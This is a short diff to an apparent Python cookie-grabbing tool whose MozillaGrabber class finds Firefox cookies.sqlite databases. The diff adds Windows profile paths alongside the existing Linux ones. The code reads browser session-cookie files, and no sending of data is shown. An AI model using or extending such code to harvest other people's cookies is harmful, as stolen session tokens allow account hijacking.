@@ -12,6 +12,7 @@ import getpass
 import os
 import platform
 import sqlite3
+import sys
 import time
 from Cookie import Cookie
 from DatabaseConnection import selectAllFrom, grabJar, addToJar
@@ -24,9 +25,8 @@ class MozillaGrabber():
       self.cookieTrail='/home/%s/.mozilla/firefox/%s/cookies.sqlite'
       self.profiles='/home/%s/.mozilla/firefox'
     elif platform.system() == "Windows":
-      self.cookieTrail='TODO'
-      self.profiles='TODO'
-      sys.exit("Still baking these cookies")
+      self.cookieTrail='C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\%s\\cookies.sqlite'
+      self.profiles='C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'
     else:
       sys.exit("Unsupported platform")
 
